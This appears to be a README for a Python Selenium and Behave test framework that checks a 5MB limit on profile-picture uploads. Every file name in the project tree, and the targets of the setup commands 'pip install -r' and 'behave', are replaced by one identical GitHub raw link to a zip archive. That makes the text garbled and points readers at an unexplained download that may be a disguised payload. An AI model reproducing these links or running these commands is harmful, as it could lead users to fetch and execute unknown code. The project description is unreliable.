##  Overview
This project automates **profile picture upload validation** on a sample web page:
- Upload **fails** if the image is **larger than 5MB**
- Upload **succeeds** if the image is **≤ 5MB**

The framework is built using:
- **Python 3.11+**
- **Selenium WebDriver**
- **Behave (BDD framework)**
- **Page Object Model (POM) with PageFactory**
- **Automatic logging & screenshots on failures**

---

## Project Structure

```plaintext
qa_profile_upload_test/
├── config/                 # Config file
│   ├── https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip
│
├── features/               # Feature files & step definitions
│   ├── https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip
│   ├── steps/
│   │   ├── https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip
│   │   └── https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip
│   └── https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip      # Behave hooks (setup/teardown, logging, reporting)
│
├── locators/               # Element locators (AuthLocators, ProfileLocators)
│
├── pages/                  # Page Objects + BasePage
│   ├── https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip
│   ├── https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip
│   └── https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip
│
├── utils/                  # Helpers (logger, page factory, config loader)
│
├── tests/test_files/       # Test files (dummy images for upload)
│   ├── https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip     # < 5MB
│   └── https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip     # > 5MB
│
├── reports/                # Auto-generated logs & screenshots (per run)
│
├── https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip        # Python dependencies
└── https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip               # Project
```
---
## Setup Instructions

- Create Virtual Environment and install required libraries
```
- python -m venv venv_selenium
- venv_selenium\Scripts\activate (Windows)
- source venv_selenium/bin/activate (Linux/Mac)
- pip install -r https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip
```

## Execution of Tests

- **behave https://github.com/SIDRATHOD/python-selenium-bdd-framework/raw/refs/heads/main/config/bdd_framework_python_selenium_v2.6.zip**
